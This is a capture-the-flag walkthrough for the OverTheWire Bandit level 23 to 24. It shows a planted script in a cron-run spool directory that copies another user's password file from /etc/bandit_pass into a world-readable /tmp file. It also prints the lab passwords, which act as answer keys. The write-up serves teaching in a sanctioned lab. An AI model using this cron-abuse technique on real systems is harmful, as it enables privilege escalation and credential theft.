# Level 23 → Level 24

## Level Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler.  
Look in `/etc/cron.d/` for the configuration and see what command is being executed.  
  
NOTE: This level requires you to create your own first shell-script.  
This is a very big step and you should be proud of yourself when you beat this level!  
  
NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Commands you may need to solve this level
`cron`, `crontab`, `crontab(5)` _(use “man 5 crontab” to access this)_

## Solution

Connect to the challenge through SSH:

```sh
~$ ssh bandit23@bandit.labs.overthewire.org -p 2220 # password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```

List scheduled tasks, for user `bandit24`:

```sh
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

Print the content of scheduled script `/usr/bin/cronjob_bandit24.sh`:

```sh
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

Considering the script is executed every minutes, we can create our own script, that will be executed from `/var/spool/bandit24/foo`:

```sh
bandit23@bandit:~$ cat << EOF > /var/spool/bandit24/foo/script.sh
#!/bin/bash
myname=\$(whoami)
mytarget=\$(echo \$myname | md5sum | cut -d ' ' -f 1)
cat /etc/bandit_pass/\$myname > /tmp/\$mytarget
chmod 644 /tmp/\$mytarget
EOF

bandit23@bandit:~$ chmod 755 /var/spool/bandit24/foo/script.sh
```

Wait a minute for the script to execute by crontab and access the result:

```sh
bandit23@bandit:~$ myname=bandit24
bandit23@bandit:~$ mytarget=$(echo $myname | md5sum | cut -d ' ' -f 1)
bandit23@bandit:~$ cat /tmp/$mytarget
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

## Resources

Challenge: https://overthewire.org/wargames/bandit/bandit24.html